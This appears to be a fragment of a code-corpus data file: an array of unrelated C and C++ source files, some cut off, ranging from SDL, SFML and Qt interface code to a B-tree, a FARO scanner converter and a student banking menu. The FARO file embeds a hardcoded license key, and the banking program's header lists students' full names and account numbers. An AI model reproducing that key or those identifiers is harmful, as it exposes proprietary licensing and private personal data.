std::shared_ptr<SDL_Renderer>(SDL_CreateRenderer(window_.get(), 1, 0), SDL_DestroyRenderer);\n\n            if(renderer.get()) { // App needs a renderer to display anything\n                std::clog << \"Renderer created...\\n\";\n                \n                isRunning_ = true;\n                std::clog << \"Shoot the swarm is running!!!\\n\";\n            }\n            else { std::cerr << \"Couldn't create a renderer!\\n\"; }\n        }\n        else { std::cerr << \"Couldn't create a window!\\n\"; }\n    }\n    else {\n        std::cerr << \"Couldn't initialize SDL!\\n\";\n        isRunning_ = false;\n    }\n}\n\nvoid App::handleEvents() {\n    SDL_Event event; // variable to store events\n\n    while(SDL_PollEvent(&event)) { // get new event\n        switch(event.type) {\n            case SDL_QUIT:\n                isRunning_ = false;\n                std::clog << \"Window closed...\\n\";\n                break;\n            \n            // >>>Add more events to be handled here<<<\n    \n            default:\n                mode->handleEvents(event);\n                break;\n        }\n    }\n}\n\nvoid App::update(const double& deltaTime) {\n    mode->update(deltaTime);\n}\n\nvoid App::render() {\n    SDL_RenderClear(renderer.get());      // Clear renderer to show new things on screen\n\n    // >>> Add stuff to render here <<<\n    mode->render();\n\n    // SDL_SetRenderDrawColor(renderer.get(), 0, 0, 0 ,0);   // invisible color to stop renderer from drawing\n    SDL_RenderPresent(renderer.get());                    // Show everything on screen\n}\n",
    "#include \"Settings.h\"\r\n\r\n\r\nSettings::Settings(float width, float height) {\r\n\r\n    if (!font.loadFromFile(\"arial.ttf\")) {\r\n        return;\r\n    }\r\n    \r\n    settings[0].setFont(font);\r\n    settings[0].setFillColor(sf::Color::Red);\r\n    settings[0].setString(\"TEST\");\r\n    settings[0].setPosition(sf::Vector2f(width / 2, height / (MAX_SIZE_OF_SETTINGS + 1) * 1));\r\n\r\n    settings[1].setFont(font);\r\n    settings[1].setFillColor(sf::Color::White);\r\n    settings[1].setString(\"Exit to menu\");\r\n    settings[1].setPosition(sf::Vector2f(width / 2, height / (MAX_SIZE_OF_SETTINGS + 1) * 2));\r\n    \r\n    selectedItemIndex = 0;\r\n}\r\n\r\nvoid Settings::draw(sf::RenderWindow& window)\r\n{\r\n\tfor(int i = 0; i < MAX_SIZE_OF_SETTINGS; ++i)\r\n\twindow.draw(settings[i]);\r\n}\r\n\r\nvoid Settings::moveDown()\r\n{\r\n    if (selectedItemIndex + 1 < MAX_SIZE_OF_SETTINGS) {\r\n        settings[selectedItemIndex].setFillColor(sf::Color::White);\r\n        selectedItemIndex++;\r\n        settings[selectedItemIndex].setFillColor(sf::Color::Red);\r\n    }\r\n}\r\n\r\nvoid Settings::moveUp()\r\n{\r\n    if (selectedItemIndex - 1 >= 0) {\r\n        settings[selectedItemIndex].setFillColor(sf::Color::White);\r\n        selectedItemIndex--;\r\n        settings[selectedItemIndex].setFillColor(sf::Color::Red);\r\n    }\r\n}\r\n\r\nint Settings::getPressedItem() const\r\n{\r\n    return selectedItemIndex;\r\n}",
    "// Autogenerated, do not edit\n\n#include <fonts/GeneratedFont.hpp>\n\nFONT_TABLE_LOCATION_FLASH_PRAGMA\nKEEP extern const touchgfx::GlyphNode glyphs_verdana_40_4bpp[] FONT_TABLE_LOCATION_FLASH_ATTRIBUTE = {\n    {     0, 0x003F,  17,  31,  31,   3,  22,   0,   0, 0x00 }\n};\n\n// verdana_40_4bpp\nFONT_TABLE_LOCATION_FLASH_PRAGMA\nKEEP extern const touchgfx::GlyphNode glyphs_verdana_40_4bpp[] FONT_TABLE_LOCATION_FLASH_ATTRIBUTE;\nFONT_GLYPH_LOCATION_FLASH_PRAGMA\nKEEP extern const uint8_t unicodes_verdana_40_4bpp_0[] FONT_GLYPH_LOCATION_FLASH_ATTRIBUTE;\nFONT_SEARCHTABLE_LOCATION_FLASH_PRAGMA\nKEEP extern const uint8_t* const unicodes_verdana_40_4bpp[] FONT_SEARCHTABLE_LOCATION_FLASH_ATTRIBUTE = {\n    unicodes_verdana_40_4bpp_0\n};\nFONT_KERNING_LOCATION_FLASH_PRAGMA\nKEEP extern const touchgfx::KerningNode kerning_verdana_40_4bpp[] FONT_KERNING_LOCATION_FLASH_ATTRIBUTE;\ntouchgfx::GeneratedFont& getFont_verdana_40_4bpp();\n\ntouchgfx::GeneratedFont& getFont_verdana_40_4bpp()\n{\n    static touchgfx::GeneratedFont verdana_40_4bpp(glyphs_verdana_40_4bpp, 1, 40, 40, 0, 0, 4, 1, 0, 0, unicodes_verdana_40_4bpp, kerning_verdana_40_4bpp, 63, 0, 0, 0);\n    return verdana_40_4bpp;\n}\n",
    "#include \"qtmaterialradiobutton.h\"\n#include \"qtmaterialradiobutton_p.h\"\n#include <QStateMachine>\n#include <QState>\n#include <QPropertyAnimation>\n#include <QColor>\n#include \"lib/qtmaterialcheckable_internal.h\"\n\n/*!\n *  \\class QtMaterialRadioButtonPrivate\n *  \\internal\n */\n\nQtMaterialRadioButtonPrivate::QtMaterialRadioButtonPrivate(QtMaterialRadioButton *q)\n    : QtMaterialCheckablePrivate(q)\n{\n}\n\nQtMaterialRadioButtonPrivate::~QtMaterialRadioButtonPrivate()\n{\n}\n\nvoid QtMaterialRadioButtonPrivate::init()\n{\n    Q_Q(QtMaterialRadioButton);\n\n    q->setAutoExclusive(true);\n\n    q->setCheckedIcon(QIcon(\":/icons/icons/toggle/svg/production/ic_radio_button_checked_24px.svg\"));\n    q->setUncheckedIcon(QIcon(\":/icons/icons/toggle/svg/production/ic_radio_button_unchecked_24px.svg\"));\n\n    uncheckedState->assignProperty(checkedIcon, \"iconSize\", 0);\n    uncheckedState->assignProperty(uncheckedIcon, \"iconSize\", 24);\n\n    disabledUncheckedState->assignProperty(checkedIcon, \"iconSize\", 0);\n    disabledUncheckedState->assignProperty(uncheckedIcon, \"iconSize\", 24);\n\n    checkedState->assignProperty(uncheckedIcon, \"iconSize\", 0);\n    checkedState->assignProperty(checkedIcon, \"iconSize\", 24);\n\n    disabledCheckedState->assignProperty(uncheckedIcon, \"iconSize\", 0);\n    disabledCheckedState->assignProperty(checkedIcon, \"iconSize\", 24);\n\n    uncheckedState->assignProperty(checkedIcon, \"opacity\", 0);\n    uncheckedState->assignProperty(uncheckedIcon, \"opacity\", 1);\n\n    checkedState->assignProperty(uncheckedIcon, \"opacity\", 0);\n    checkedState->assignProperty(checkedIcon, \"opacity\", 1);\n\n    checkedIcon->setIconSize(0);\n\n    //\n\n    checkedState->assignProperty(checkedIcon, \"color\", q->checkedColor());\n    checkedState->assignProperty(uncheckedIcon, \"color\", q->uncheckedColor());\n    uncheckedState->assignProperty(uncheckedIcon, \"color\", q->uncheckedColor());\n\n    QPropertyAnimation *animation;\n\n    animation = new QPropertyAnimation(checkedIcon, \"iconSize\", q);\n    animation->setDuration(250);\n    stateMachine->addDefaultAnimation(animation);\n\n    animation = new QPropertyAnimation(uncheckedIcon, \"iconSize\", q);\n    animation->setDuration(250);\n    stateMachine->addDefaultAnimation(animation);\n\n    animation = new QPropertyAnimation(uncheckedIcon, \"opacity\", q);\n    animation->setDuration(250);\n    stateMachine->addDefaultAnimation(animation);\n\n    animation = new QPropertyAnimation(checkedIcon, \"opacity\", q);\n    animation->setDuration(250);\n    stateMachine->addDefaultAnimation(animation);\n}\n\n/*!\n *  \\class QtMaterialRadioButton\n */\n\nQtMaterialRadioButton::QtMaterialRadioButton(QWidget *parent)\n    : QtMaterialCheckable(*new QtMaterialRadioButtonPrivate(this), parent)\n{\n    d_func()->init();\n}\n\nQtMaterialRadioButton::~QtMaterialRadioButton()\n{\n}\n\nvoid QtMaterialRadioButton::setupProperties()\n{\n    QtMaterialCheckable::setupProperties();\n\n    Q_D(QtMaterialRadioButton);\n\n    d->checkedState->assignProperty(d->checkedIcon, \"color\", checkedColor());\n    d->checkedState->assignProperty(d->uncheckedIcon, \"color\", uncheckedColor());\n    d->uncheckedState->assignProperty(d->uncheckedIcon, \"color\", uncheckedColor());\n}\n",
    "#include <stdio.h>\n#include <iostream>\n#include <vector>\n#include <fstream>\n#include <string>\n#include <math.h>\n#include <stack>\n#include <algorithm>\n#include <queue>\n\nusing namespace std;\n\nclass RedRacuna {\npublic:\n\tlong long int CA_ID, CA_B_ID, CA_C_ID;\n\tint CA_TAX_ST;\n\tstring CA_NAME;\n\tdouble CA_BAL;\n\n\tRedRacuna(long long int AID, long long int BID, long long CID, string NAME, int TAX, double BAL) :CA_ID(AID), CA_B_ID(BID), CA_C_ID(CID), CA_NAME(NAME), CA_TAX_ST(TAX), CA_BAL(BAL) {}\n\tvoid print();\n\tfriend class Cvor;\n\tfriend class BStablo;\n};\nvoid RedRacuna::print() {\n\tcout << fixed;\n\tcout << CA_ID << \" \" << CA_B_ID << \" \" << CA_C_ID << \" \" << CA_NAME << \" \" << CA_TAX_ST << \" \" << CA_BAL << endl;\n}\n\nclass Cvor {\npublic:\n\tCvor(bool list, int redStabla);\n\tfriend class BStablo;\n\tbool jeList;\n\tCvor* otac;\n\tvector<long long int> kljucevi;\n\tvector <Cvor*> deca;\n\tvector<RedRacuna> sviRacuni;\n};\nCvor::Cvor(bool list, int redStabla) {\n\tjeList = list;\n\n\tkljucevi.resize(redStabla - 1);\n\tfill(kljucevi.begin(), kljucevi.end(), 0);\n\tdeca.resize(redStabla);\n\t//fill(deca.begin(), deca.end(), NULL);\n\tCvor* otac = NULL;\n}\n\nclass BStablo {\npublic:\n\tBStablo(int red, Cvor* koren = NULL) :redStabla(red), koren(koren) {}\n\tBStablo() = default;\n\tvoid ubaci(RedRacuna);\n\tvoid izbrisi();\n\tvoid nadjiSVE(long long int);\n\tCvor* koren;\n\n\tint redStabla;\n\n};\n\nint prebroj(vector<long long int> v1) {\n\tint br = 0;\n\tif (v1.size() == 0) return 0;\n\tfor (int i = 0; i < v1.size(); i++) if (v1[i] != 0) br++;\n\treturn br;\n}\nvoid BStablo::nadjiSVE(long long int CAID) {\n\tfor (int i = 0; i < koren->sviRacuni.size(); i++) {\n\t\tif (koren->sviRacuni[i].CA_ID == CAID) koren->sviRacuni[i].print();\n\t}\n\n\n}\n\nvoid BStablo::ubaci(RedRacuna r1) {\n\n\tint maxkljucCvora = redStabla - 1;\n\tint maxPokPodstabla = redStabla;\n\tint velicina, ubacenIsti;\n\tint gotovo = 0;\n\tif (koren == NULL) {\n\t\tkoren = new Cvor(true, redStabla);\n\t\tkoren->kljucevi[0] = r1.CA_C_ID;\n\t\tkoren->sviRacuni.push_back(r1);\n\t}\n\telse {\n\t\tint prethodni, trenutni = 0;\n\t\tCvor* current = koren;\n\t\tstack<Cvor*> stack;\n\t\tfor (int i = 0; i < current->kljucevi.size() - 1; i++) {\n\t\t\tif (r1.CA_C_ID < current->kljucevi[i] && current->deca[i] != NULL) {\n\n\t\t\t\tcurrent = current->deca[i];\n\t\t\t\ti = -1;\n\t\t\t}\n\t\t\telse if (r1.CA_C_ID > current->kljucevi[i] && r1.CA_C_ID < current->kljucevi[i + 1] && current->deca[i + 1] != NULL) {\n\n\t\t\t\tcurrent = current->deca[i + 1];\n\t\t\t\ti = -1;\n\t\t\t}\n\t\t\telse if (r1.CA_C_ID > current->kljucevi[i] && current->kljucevi[i + 1] == 0 && current->deca[i + 1] != NULL) {\n\n\t\t\t\tcurrent = current->deca[i + 1];\n\t\t\t\ti = -1;\n\t\t\t}\n\t\t\telse if (r1.CA_C_ID > current->kljucevi[i + 1] && current->deca[i + 2] != NULL && i == current->kljucevi.size() - 2) {\n\n\t\t\t\tcurrent = current->deca[i + 2];\n\t\t\t\ti = -1;\n\t\t\t}\n\t\t}\n\n\t\tvelicina = prebroj(current->kljucevi) + 1;\n\t\tubacenIsti = 0;\n\n\t\tfor (int i = 0; i < current->kljucevi.size(); i++) {\n\t\t\tif (current->kljucevi[i] == r1.CA_C_ID) {\n\t\t\t\tcurrent->sviRacuni.push_back(r1);\n\t\t\t\tubacenIsti = 1;\n\t\t\t\tgotovo = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tif (velicina <= maxkljucCvora && ubacenIsti == 0) {\n\t\t\tfor (int i = 0; i < current->kljucevi.size(); i++) {\n\t\t\t\tif (current->kljucevi[i + 1] != 0) {\n\t\t\t\t\tif (r1.CA_C_ID > current->kljucevi[i] && r1.CA_C_ID < current->kljucevi[i + 1]) {\n\t\t\t\t\t\tfor (int j = current->kljucevi.size() - 1; j > i; j--) current->kljucevi[i] = current->kljucevi[i - 1];\n\t\t\t\t\t\tcurrent->kljucevi[i + 1] = r1.CA_C_ID;\n\t\t\t\t\t\tcurrent->sviRacuni.push_back(r1);\n\t\t\t\t\t\tgotovo = 1;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (current->kljucevi[i + 1] == 0) {\n\t\t\t\t\tif (current->kljucevi[i] < r1.CA_C_ID) {\n\t\t\t\t\t\tcurrent->kljucevi[i + 1] = r1.CA_C_ID;\n\t\t\t\t\t\tcurrent->sviRacuni.push_back(r1);\n\t\t\t\t\t\tgotovo = 1;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\telse if (current->kljucevi[i] > r1.CA_C_ID) {\n\t\t\t\t\t\tfor (int j = current->kljucevi.size() - 1; j > i; j--) current->kljucevi[j] = current->kljucevi[j - 1];\n\t\t\t\t\t\tcurrent->kljucevi[i] = r1.CA_C_ID;\n\t\t\t\t\t\tcurrent->sviRacuni.push_back(r1);\n\t\t\t\t\t\tgotovo = 1;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse if (velicina > maxkljucCvora && ubacenIsti == 0) {\n\t\t\tCvor* prethodnidesni = NULL;\n\t\t\tcurrent->kljucevi.push_back(r1.CA_C_ID);\n\t\t\tcurrent->sviRacuni.push_back(r1);\n\t\t\twhile (velicina > maxkljucCvora && current) {\n\n\t\t\t\tif (current == koren) {\n\t\t\t\t\t// PROMENI DA SE PRVO TAJ NOVI DODA U RED OD M CVOROVA PA SE SORTIRA LEPO PA SE IZABERE SREDNJI A NE OD STARIH DA SE BIRA SREDNJI I IDE GORE!\n\n\t\t\t\t\tsort(current->kljucevi.begin(), current->kljucevi.end());\n\n\t\t\t\t\tCvor* noviKoren = new Cvor(false, redStabla);\n\t\t\t\t\tnoviKoren->kljucevi[0] = current->kljucevi[ceil(current->kljucevi.size() / 2.0) - 1];\n\t\t\t\t\tnoviKoren->deca[0] = current;\n\t\t\t\t\tcurrent->otac = noviKoren;\n\n\t\t\t\t\tkoren = noviKoren;\n\t\t\t\t\tvector<int> za_brisanje;\n\n\t\t\t\t\tfor (int i = 0; i < current->sviRacuni.size(); i++) {\n\t\t\t\t\t\tif (noviKoren->kljucevi[0] == current->sviRacuni[i].CA_C_ID) {\n\t\t\t\t\t\t\tnoviKoren->sviRacuni.push_back(current->sviRacuni[i]);\n\t\t\t\t\t\t\tif (i < current->sviRacuni.size()) za_brisanje.push_back(i);\n\t\t\t\t\t\t}\n\t\t\t\t",
    "\ufeff// FaroScannerController.cpp\n#include \"faroscannercontroller.h\"\n#include <QMutex>\n\nQPointer<FaroScannerController> FaroScannerController::instancePtr = nullptr;\nQMutex FaroScannerController::mutex;\n\nFaroScannerController* FaroScannerController::instance() {\n    QMutexLocker locker(&mutex);\n    if (!instancePtr) {\n        instancePtr = new FaroScannerController();\n    }\n    return instancePtr;\n}\n\nFaroScannerController::FaroScannerController(QObject *parent) : QObject(parent)\n{\n    iQLibIfPtr = nullptr;\n}\n\n\nbool FaroScannerController::initIiQLibInternal()\n{\n    try {\n        const wchar_t* licenseText1 =\n                L\"FARO Open Runtime License\\n\"\n                L\"Key: 434ELNNRTCTXXMKT8KVUSPUPS\\n\"\n                L\"\\n\"\n                L\"The software is the registered property of \"\n                L\"FARO Scanner Production GmbH, Stuttgart, Germany.\\n\"\n                L\"All rights reserved.\\n\"\n                L\"This software may only be used with written permission \"\n                L\"of FARO Scanner Production GmbH, Stuttgart, Germany.\";\n        BSTR licenseCode1 = SysAllocString(licenseText1);\n        IiQLicensedInterfaceIfPtr licPtr1(__uuidof(iQLibIf));\n        try {\n            licPtr1->License = licenseCode1;\n            iQLibIfPtr = static_cast<IiQLibIfPtr>(licPtr1);\n        }\n        catch (...) {\n            qDebug() << \"No license for iQOpen interface provided\";\n            return false;\n        }\n    }\n    catch (...) {\n        qDebug() << \"Cannot access iQOpen\";\n        return false;\n    }\n\n    if (iQLibIfPtr == NULL) {\n        qDebug() << \"Failed to initialize iQOpen\";\n        return false;\n    }\n\n    return true;\n}\n\n\n\n\n\n\n\n\nvoid FaroScannerController::iQLibIfPtrDisconnect()\n{\n    if (iQLibIfPtr) {\n        iQLibIfPtr = nullptr;\n    }\n}\n\nvoid FaroScannerController::convertFlsToPly(const QString& inFlsFilePath,const QString& outPlyFilePath)\n{\n    convertFlsToPly(inFlsFilePath,outPlyFilePath,6,3);\n}\n\nvoid FaroScannerController::convertFlsToPly(const QString &inFlsFilePath,\n                                            const QString &outPlyFilePath,\n                                            int xyCropDist,\n                                            int zCropDist)\n{\n    initIiQLibInternal();\n    HRESULT result;\n    std::string stdStr = inFlsFilePath.toStdString();\n    const char* cStr = stdStr.c_str();\n    _bstr_t bstr(cStr);\n    result = iQLibIfPtr->load(cStr);\n    qDebug() << \"result: \" << result;\n\n    int scans = iQLibIfPtr->getNumScans();\n    qDebug() << \"scans: \" << scans;\n    int row = iQLibIfPtr->getScanNumRows(0);\n    int col = iQLibIfPtr->getScanNumCols(0);\n    qDebug() << \"row: \" << row;\n    qDebug() << \"col: \" << col;\n\n    QString m_ScanNo = \"0\";\n    int scanNo = m_ScanNo.toInt();\n    double Rx, Ry, Rz, angle;\n    iQLibIfPtr->getScanOrientation(scanNo, &Rx, &Ry, &Rz, &angle);\n    qDebug() << Rx << \"  \" << Ry << \"  \" << Rz << \"  \" << angle;\n\n    double cosAngle = cos(angle);\n    double sinAngle = sin(angle);\n\n    QVector<CartesianPoint> allPoints(row * col);\n\n    auto processRow = [&](int i) {\n        QVector<CartesianPoint> rowPoints(col);\n        for (int j = 0; j < col; ++j) {\n            double x, y, z;\n            int refl;\n            iQLibIfPtr->getScanPoint(scanNo, i, j, &x, &y, &z, &refl);\n\n            CartesianPoint cartesian;\n            cartesian.x = (Rx * Rx * (1 - cosAngle) + cosAngle) * x\n                    + (Ry * Rx * (1 - cosAngle) - Rz * sinAngle) * y\n                    + (Rz * Rx * (1 - cosAngle) + Ry * sinAngle) * z;\n\n            cartesian.y = (Rx * Ry * (1 - cosAngle) + Rz * sinAngle) * x\n                    + (Ry * Ry * (1 - cosAngle) + cosAngle) * y\n                    + (Rz * Ry * (1 - cosAngle) - Rx * sinAngle) * z;\n\n            cartesian.z = (Rx * Rz * (1 - cosAngle) - Ry * sinAngle) * x\n                    + (Ry * Rz * (1 - cosAngle) + Rx * sinAngle) * y\n                    + (Rz * Rz * (1 - cosAngle) + cosAngle) * z;\n\n            cartesian.intensity = refl / 255.0;\n            rowPoints[j] = cartesian;\n        }\n        return rowPoints;\n    };\n\n    QVector<QFuture<QVector<CartesianPoint>>> futures;\n    for (int i = 0; i < row; ++i) {\n        futures.append(QtConcurrent::run(processRow, i));\n    }\n\n    int index = 0;\n    for (auto &future : futures) {\n        future.waitForFinished();\n        for (auto &point : future.result()) {\n            allPoints[index++] = point;\n        }\n    }\n\n    syncPlyApi.myXYZData = allPoints.toStdVector();\n    syncPlyApi.downSamplePoint(xyCropDist, zCropDist);\n    std::ofstream outfile(outPlyFilePath.toStdString());\n    syncPlyApi.SavePly(outfile, syncPlyApi.myXYZData);\n    syncPlyApi.myXYZData.clear();\n    iQLibIfPtrDisconnect();\n}\n\n\n",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#include <glm/glm.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/gtx/dual_quaternion.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct tvec1<uint8, lowp>;\ntemplate struct tvec1<uint16, lowp>;\ntemplate struct tvec1<uint32, lowp>;\ntemplate struct tvec1<uint64, lowp>;\ntemplate struct tvec1<int8, lowp>;\ntemplate struct tvec1<int16, lowp>;\ntemplate struct tvec1<int32, lowp>;\ntemplate struct tvec1<int64, lowp>;\ntemplate struct tvec1<float32, lowp>;\ntemplate struct tvec1<float64, lowp>;\n\ntemplate struct tvec1<uint8, mediump>;\ntemplate struct tvec1<uint16, mediump>;\ntemplate struct tvec1<uint32, mediump>;\ntemplate struct tvec1<uint64, mediump>;\ntemplate struct tvec1<int8, mediump>;\ntemplate struct tvec1<int16, mediump>;\ntemplate struct tvec1<int32, mediump>;\ntemplate struct tvec1<int64, mediump>;\ntemplate struct tvec1<float32, mediump>;\ntemplate struct tvec1<float64, mediump>;\n\ntemplate struct tvec1<uint8, highp>;\ntemplate struct tvec1<uint16, highp>;\ntemplate struct tvec1<uint32, highp>;\ntemplate struct tvec1<uint64, highp>;\ntemplate struct tvec1<int8, highp>;\ntemplate struct tvec1<int16, highp>;\ntemplate struct tvec1<int32, highp>;\ntemplate struct tvec1<int64, highp>;\ntemplate struct tvec1<float32, highp>;\ntemplate struct tvec1<float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct tvec2<uint8, lowp>;\ntemplate struct tvec2<uint16, lowp>;\ntemplate struct tvec2<uint32, lowp>;\ntemplate struct tvec2<uint64, lowp>;\ntemplate struct tvec2<int8, lowp>;\ntemplate struct tvec2<int16, lowp>;\ntemplate struct tvec2<int32, lowp>;\ntemplate struct tvec2<int64, lowp>;\ntemplate struct tvec2<float32, lowp>;\ntemplate struct tvec2<float64, lowp>;\n\ntemplate struct tvec2<uint8, mediump>;\ntemplate struct tvec2<uint16, mediump>;\ntemplate struct tvec2<uint32, mediump>;\ntemplate struct tvec2<uint64, mediump>;\ntemplate struct tvec2<int8, mediump>;\ntemplate struct tvec2<int16, mediump>;\ntemplate struct tvec2<int32, mediump>;\ntemplate struct tvec2<int64, mediump>;\ntemplate struct tvec2<float32, mediump>;\ntemplate struct tvec2<float64, mediump>;\n\ntemplate struct tvec2<uint8, highp>;\ntemplate struct tvec2<uint16, highp>;\ntemplate struct tvec2<uint32, highp>;\ntemplate struct tvec2<uint64, highp>;\ntemplate struct tvec2<int8, highp>;\ntemplate struct tvec2<int16, highp>;\ntemplate struct tvec2<int32, highp>;\ntemplate struct tvec2<int64, highp>;\ntemplate struct tvec2<float32, highp>;\ntemplate struct tvec2<float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct tvec3<uint8, lowp>;\ntemplate struct tvec3<uint16, lowp>;\ntemplate struct tvec3<uint32, lowp>;\ntemplate struct tvec3<uint64, lowp>;\ntemplate struct tvec3<int8, lowp>;\ntemplate struct tvec3<int16, lowp>;\ntemplate struct tvec3<int32, lowp>;\ntemplate struct tvec3<int64, lowp>;\ntemplate struct tvec3<float32, lowp>;\ntemplate struct tvec3<float64, lowp>;\n\ntemplate struct tvec3<uint8, mediump>;\ntemplate struct tvec3<uint16, mediump>;\ntemplate struct tvec3<uint32, mediump>;\ntemplate struct tvec3<uint64, mediump>;\ntemplate struct tvec3<int8, mediump>;\ntemplate struct tvec3<int16, mediump>;\ntemplate struct tvec3<int32, mediump>;\ntemplate struct tvec3<int64, mediump>;\ntemplate struct tvec3<float32, mediump>;\ntemplate struct tvec3<float64, mediump>;\n\ntemplate struct tvec3<uint8, highp>;\ntemplate struct tvec3<uint16, highp>;\ntemplate struct tvec3<uint32, highp>;\ntemplate struct tvec3<uint64, highp>;\ntemplate struct tvec3<int8, highp>;\ntemplate struct tvec3<int16, highp>;\ntemplate struct tvec3<int32, highp>;\ntemplate struct tvec3<int64, highp>;\ntemplate struct tvec3<float32, highp>;\ntemplate struct tvec3<float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct tvec4<uint8, lowp>;\ntemplate struct tvec4<uint16, lowp>;\ntemplate struct tvec4<uint32, lowp>;\ntemplate struct tvec4<uint64, lowp>;\ntemplate struct tvec4<int8, lowp>;\ntemplate struct tvec4<int16, lowp>;\ntemplate struct tvec4<int32, lowp>;\ntemplate struct tvec4<int64, lowp>;\ntemplate struct tvec4<float32, lowp>;\ntemplate struct tvec4<float64, lowp>;\n\ntemplate struct tvec4<uint8, mediump>;\ntemplate struct tvec4<uint16, mediump>;\ntemplate struct tvec4<uint32, mediump>;\ntemplate struct tvec4<uint64, mediump>;\ntemplate struct tvec4<int8, mediump>;\ntemplate struct tvec4<int16, mediump>;\ntemplate struct tvec4<int32, mediump>;\ntemplate struct tvec4<int64, mediump>;\ntemplate struct tvec4<float32, mediump>;\ntemplate struct tvec4<float64, mediump>;\n\ntemplate struct tvec4<uint8, highp>;\ntemplate struct tvec4<uint16, highp>;\ntemplate struct tvec4<uint32, highp>;\ntemplate struct tvec4<uint64, highp>;\ntemplate struct tvec4<int8, highp>;\ntemplate struct tvec4<int16, highp>;\ntemplate struct tvec4<int32, highp>;\ntemplate struct tvec4<int64, highp>;\ntemplate struct tvec4<float32, highp>;\ntemplate struct tvec4<float64, highp>;\n\n// tmat2x2 type explicit instantiation\ntemplate struct tmat2x2<float32, lowp>;\ntemplate struct tmat2x2<float64, lowp>;\n\ntemplate struct tm",
    " /* GRUPO # 6\r\n\r\nINTEGRANTES:  \r\nNOMRBRE COMPLETO                      N- DE CUENTA \r\n1. MARIO ROBERTO GUILLEN RODRIGUEZ   20191001472\r\n2. MILTON MISAEL FIGUEROA LAGOS      20221030193\r\n3. ALEXANDRA NICOLLE CERNA FUNEZ     20231000357\r\n4. ELIANY MICHELLE REYES MOLINA      20231001137\r\n5. MAYLYN AURORA AMADOR FLORES       20231000620*/ \r\n\r\n#include <iostream>\r\n#include <math.h>\r\n#include <windows.h>\nusing namespace std;\r\n\r\n// Declaraci\u00f3n de las funciones\r\nvoid menuAcreditar();\r\nvoid menuDebitar();\r\nvoid menuVerSaldo();\r\nvoid menuTransferenicas();\r\nvoid menuCanjePuntos();\r\n\r\n\n//Variables del menu\r\nint menu, shortMenu;\r\n\r\n//Variables para datos personale y datos de los beneficiarios\r\nstring nombreCliente, nombreBeneficiarioUno, nombreBeneficiarioDos, nombreBeneficiarioTres;\r\nchar generoCliente;\r\nint edadCliente;\r\nlong long numeroIdentidad;\t\r\n\r\n//VAriable para la cantidad con la que hara la apertura de su cuenta\r\nint depositoApertura;\r\n\r\n//Variable para el saldo general en la cuenta\r\nfloat saldoGeneralLPS = 0;\r\nfloat saldoGeneraDLR = 24.78; //Precio del dolar actualmente\r\n\r\n//Variables para la area de acreditar\r\nint opcionMenuAcreditar;\r\nint cantidadAcreditar, acumuladorAcreditaciones;\r\nint opcionUno=100, opcionDos = 200, opcionTres = 300, opcionCuatro = 400;\r\nint a = 0, l = 0; //a = Contador de acreditaciones  l = cuenta las littecoin ganadas\r\n\r\n//Variables para el area de debitar\r\nint opcionMenuDebitar, cobroDosLempiras = 2;\r\nfloat dosPorciento = 0.02, cobroDosPorciento, acumCobroDebito2, acum2PorCiento, acumDebitado;\r\nint cantidadDebitar,  d = 0, dp = 0; //d = contador de 2 lempiras cargo dp = contador debito por porcentaje\r\n\r\n\r\n\r\n//Variables de las criptomonedas\r\nfloat littecoin = 495.60;\r\nfloat bitcoin   = 2477.98;\r\nfloat ethereum = 1238.99;\t\r\n\r\n//Variables para la area de ver saldo\r\n\r\nint s = 0; //contador ver saldo\r\nint cobroVerSaldo = 5;\r\nint acumVerSaldo = 0;\r\n\r\n//VARIABLES DE LAS TRANSFERENCIAS\r\nint cantidadLitecoins, cantidadBitcoins, CantidadEtherum; \r\nint acumLitecoins, acumBitcoins, acumEtherums;\r\nfloat sueldoBeneficiario1, sueldoBeneficiario2, sueldoBeneficiario3;\r\n//acumuladores por criptomonedas y beneficiero\r\nint acumBeneficiarioLit1, acumBeneficiarioEthe1, acumBeneficiarioBit1;\r\nint acumBeneficiarioLit2, acumBeneficiarioEthe2, acumBeneficiarioBit2;\r\nint acumBeneficiarioLit3, acumBeneficiarioEthe3, acumBeneficiarioBit3;\r\n\r\n\r\n\r\nvoid setColor(int textColor, int backgroundColor) {\n\t\r\n}\r\n\r\n\r\n\n\nint main(int argc, char *argv[]) {\r\n\t\r\n\tint background = 112;\r\n\tHANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\r\n\tSetConsoleTextAttribute(hConsole, 112);\r\n\t\r\n\t\r\n\t//Datos personales\r\n\tcout<<  \"                                                           ..............................................................................................\"<<endl;\r\n\tSetConsoleTextAttribute(hConsole, background | FOREGROUND_BLUE);\n\tcout << \"                                                           .                                   FINANCIERA PUMA BANK                                     .\" << endl;\r\n\tSetConsoleTextAttribute(hConsole, 112);\n\tcout << \"                                                           .                                       APERTURA DE CUENTA                                   .\" << endl;\n\tcout<<  \"                                                           ..............................................................................................\"<<endl;\n\tcout << \"                                                           .                                   INGRESO SUS DATOS PERSONALES                             .\" << endl;\n\tcout<<  \"                                                           ..............................................................................................\"<<endl;\n\tcout << \"                                                           .                           INGRESE SU PRIMER NOMBRE Y PRIMER APELLIDO                       .\" << endl;\r\n\tcout << \"                                                           .                                             \";\n\tgetline(cin >> ws, nombreCliente);\n\tcout << \"                                                           .                             INGRESE SU EDAD (EN UN RANGO DE 18 A 90)                       .\" << endl;\n\tcout << \"                                                                                                          \";                           \n\tcin >> edadCliente;\n\t\n\t// Validaci\u00f3n para edad fuera del rango predeterminado\n\twhile (edadCliente < 18 || edadCliente > 90) {\r\n\t\tsystem(\"cls\");\r\n\t\t\n\t\tcout << \"                                                       ..............................................................................................\" << endl;\r\n\t\tSetConsoleTextAttribute(hConsole, background | FOREGROUND_RED);\n\t\tcout << \"                                                       .                      ERROR : EDAD INGRESADA FUERA DEL RANGO ADMITIDO                       .\" << endl;\r\n\t\t\r\n\t\t// Rest",
